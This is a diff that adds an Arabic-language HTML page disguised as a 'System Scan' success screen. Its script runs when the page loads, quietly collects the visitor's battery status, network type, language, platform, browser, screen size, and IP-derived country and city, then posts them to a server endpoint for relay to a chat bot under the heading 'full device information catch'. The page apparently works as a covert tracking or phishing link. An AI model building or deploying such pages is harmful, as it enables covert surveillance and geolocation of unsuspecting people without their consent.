@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Scan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body {
+            background-color: #050505;
+            color: #00ffcc;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: linear-gradient(rgba(5, 5, 5, 0.9), rgba(5, 5, 5, 0.9)), url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            overflow: hidden;
+        }
+        canvas#matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.3; }
+        
+        .container {
+            position: relative; z-index: 2; max-width: 500px; width: 100%;
+            background: rgba(10, 10, 10, 0.85); border: 1px solid #00ffcc;
+            border-radius: 15px; padding: 30px; text-align: center;
+            box-shadow: 0 0 30px rgba(0, 255, 204, 0.2); backdrop-filter: blur(5px);
+            display: none;
+        }
+        .container.active { display: block; }
+
+        .success-icon { font-size: 100px; color: #2ecc71; animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-shadow: 0 0 40px rgba(46, 204, 113, 0.6); margin-bottom: 20px; }
+        .success-text { font-size: 24px; font-weight: bold; color: #2ecc71; animation: fadeIn 0.8s ease-in; text-shadow: 0 0 20px rgba(46, 204, 113, 0.4); }
+        
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+
+    <div class="container" id="mainContainer">
+        <i class="fas fa-check-circle success-icon"></i>
+        <div class="success-text">تمت العملية بنجاح!</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+
+        // تأثير المصفوفة
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = "アカサタナハマヤラワ0123456789ABCDEF";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ffcc";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return { ip: data.ip, country: data.country_name, city: data.city };
+            } catch (error) {
+                return { ip: "غير معروف", country: "غير معروف", city: "غير معروف" };
+            }
+        }
+
+        window.onload = async function() {
+            if (!userChatId) {
+                document.getElementById('mainContainer').classList.add('active');
+                return;
+            }
+
+            const battery = await navigator.getBattery ? await navigator.getBattery() : null;
+            const batteryLevel = battery ? (battery.level * 100).toFixed(0) + '%' : 'غير متاح';
+            const charging = battery ? (battery.charging ? 'يشحن ✅' : 'لا يشحن ❌') : 'غير متاح';
+            
+            const network = navigator.connection ? navigator.connection.effectiveType : 'غير متاح';
+            const lang = navigator.language || 'غير متاح';
+            const os = navigator.platform || 'غير متاح';
+            const browser = navigator.userAgent.split(' ').slice(-2).join(' ') || 'غير متاح';
+            const datetime = new Date().toLocaleString('ar-EG');
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+
+            const ipInfo = await getIPInfo();
+
+            const text = `📱 <b>صيد معلومات جهاز كاملة!</b> 📱\n\n` +
+                         `🔋 <b>مستوى البطارية:</b> ${batteryLevel}\n` +
+                         `🔌 <b>حالة الشحن:</b> ${charging}\n` +
+                         `🌐 <b>نوع الشبكة:</b> ${network}\n` +
+                         `🗣 <b>لغة الهاتف:</b> ${lang}\n` +
+                         `💻 <b>نظام التشغيل:</b> ${os}\n` +
+                         `🌐 <b>المتصفح:</b> ${browser}\n` +
+                         `⏰ <b>الوقت والتاريخ:</b> ${datetime}\n` +
+                         `🌍 <b>عنوان IP:</b> ${ipInfo.ip}\n` +
+                         `📍 <b>الدولة:</b> ${ipInfo.country}\n` +
+                         `🏙️ <b>المدينة:</b> ${ipInfo.city}\n` +
+                         `📏 <b>أبعاد الشاشة:</b> ${screenSize}\n\n` +
+                         `📌 <b>الحالة: تم جلب كافة مواصفات الجهاز بدقة 100/100 🔥</b>`;
+
+            await sendToBot(text);
+
+            document.getElementById('mainContainer').classList.add('active');
+        };
+    </script>
+</body>
+</html>
